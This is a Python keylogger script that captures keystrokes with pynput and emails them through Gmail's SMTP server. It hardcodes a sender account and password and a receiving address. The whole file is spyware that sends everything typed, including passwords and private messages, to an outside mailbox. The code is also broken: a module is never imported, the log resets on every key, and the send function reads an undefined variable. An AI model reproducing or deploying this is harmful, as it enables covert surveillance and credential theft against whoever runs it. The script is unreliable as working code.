import getpass
import smtplib
from pynput.keyboard import Key, Listener

print("start logging")

sender_email="group38sender@gmail.com"
password="39gpezdemo"
server = smtplib.SMTP_SSL('smtp.gmail.com', 465)
server.login(sender_email, password)

##RECIEVER MODEL##
reciever_email ="sustainrobotics@gmail.com"

### https://pypi.org/project/pynput/
def on_press(key):
    email_char_limit = 150
    full_log = ""
    word = ""
    
    if key == Key.space or key == Key.enter:
        word = word + ' '
        full_log = full_log+word
        word = ""
        if len(full_log) >= email_char_limit:
            send_log()
            full_log = ""
    elif key == Key.shift_l or key==Key.shift_r:
            pass
    elif key == Key.backspace:
            word = word[:-1]
    else:
            char = "{k}".format(k=key)
            char = char[1:-1]
            word = word+char
    if key == Key.esc:
        return False
    
def send_log():
    server.sendmail(sender_email, reciever_email, full_log)

    
    

with keyboard.Listener(
        on_press=on_press) as listener:
    try:
        listener.join()
    except MyException as e:
        print('{0} was pressed'.format(e.args[0]))